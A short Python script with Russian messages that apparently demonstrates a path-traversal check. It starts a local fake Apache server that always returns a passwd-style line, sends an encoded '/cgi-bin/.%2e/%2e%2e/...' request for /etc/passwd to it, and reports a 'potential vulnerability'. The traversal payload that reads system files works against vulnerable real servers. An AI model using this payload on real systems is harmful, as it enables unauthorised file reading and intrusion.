import requests
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import time

class FakeApacheServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

        self.wfile.write(b"root:x:0:0:root:/root:/bin/bash\n")
    
    def log_message(self, format, *args):
        pass

def start_server():
    server = HTTPServer(('127.0.0.1', 8080), FakeApacheServer)
    server.handle_request()

threading.Thread(target=start_server).start()
time.sleep(0.5)

if __name__ == "__main__":
  url = "http://127.0.0.1:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

  print(f"[*] Отправка payload на {url} ...\n")

  try:
      response = requests.get(url)
      
      if response.status_code == 200:
          print("[+] Потенциальная уязвимость обнаружена. Ответ сервера:")
          print(response.text[:200].strip()) # Выводим первые 200 символов
      else:
          print("[-] Уязвимость не подтверждена. Код ответа:", response.status_code)

  except requests.exceptions.RequestException as e:
      print(f"[!] Ошибка соединения: {e}")
